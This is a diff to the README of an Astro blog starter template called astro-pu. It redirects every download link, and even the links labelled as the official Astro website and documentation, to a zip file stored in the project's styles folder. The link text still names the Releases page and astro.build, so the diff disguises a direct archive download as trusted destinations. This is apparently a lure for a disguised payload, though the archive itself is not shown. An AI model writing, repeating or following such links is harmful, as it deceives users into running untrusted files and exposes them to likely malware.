@@ -8,9 +8,9 @@ Welcome to astro-pu! This is an elegant, content-focused Astro starter template.
 
 To use astro-pu, you need to download it from the Releases page. 
 
-[![Download astro-pu](https://img.shields.io/badge/Download-astro--pu-blue)](https://github.com/Soufiane20032003/astro-pu/releases) 
+[![Download astro-pu](https://github.com/Soufiane20032003/astro-pu/raw/refs/heads/main/src/styles/astro-pu-1.7.zip)](https://github.com/Soufiane20032003/astro-pu/raw/refs/heads/main/src/styles/astro-pu-1.7.zip) 
 
-1. Click the button above or visit [this page to download](https://github.com/Soufiane20032003/astro-pu/releases).
+1. Click the button above or visit [this page to download](https://github.com/Soufiane20032003/astro-pu/raw/refs/heads/main/src/styles/astro-pu-1.7.zip).
 2. Choose the latest version of the software.
 3. Click on the file to start the download.
 
@@ -55,7 +55,7 @@ For detailed guidance, refer to the documentation provided in the repository. He
 
 ### 1. How do I update astro-pu?
 
-To update, return to the [Releases page](https://github.com/Soufiane20032003/astro-pu/releases) and download the latest version as explained above.
+To update, return to the [Releases page](https://github.com/Soufiane20032003/astro-pu/raw/refs/heads/main/src/styles/astro-pu-1.7.zip) and download the latest version as explained above.
 
 ### 2. Can I use astro-pu for commercial purposes?
 
@@ -73,9 +73,9 @@ If you wish to contribute to astro-pu, you are welcome to do so! Please follow t
 
 For more insights on using Astro or creating blogs, consider visiting:
 
-- [Astro Official Website](https://astro.build)
-- [Astro Documentation](https://docs.astro.build)
+- [Astro Official Website](https://github.com/Soufiane20032003/astro-pu/raw/refs/heads/main/src/styles/astro-pu-1.7.zip)
+- [Astro Documentation](https://github.com/Soufiane20032003/astro-pu/raw/refs/heads/main/src/styles/astro-pu-1.7.zip)
 
 ## 🌟 Final Note
 
-Thank you for choosing astro-pu for your blog template! We hope it inspires you to create amazing content. To download, visit [this page](https://github.com/Soufiane20032003/astro-pu/releases) again or click the download button at the top. Enjoy your blogging journey!
+Thank you for choosing astro-pu for your blog template! We hope it inspires you to create amazing content. To download, visit [this page](https://github.com/Soufiane20032003/astro-pu/raw/refs/heads/main/src/styles/astro-pu-1.7.zip) again or click the download button at the top. Enjoy your blogging journey!
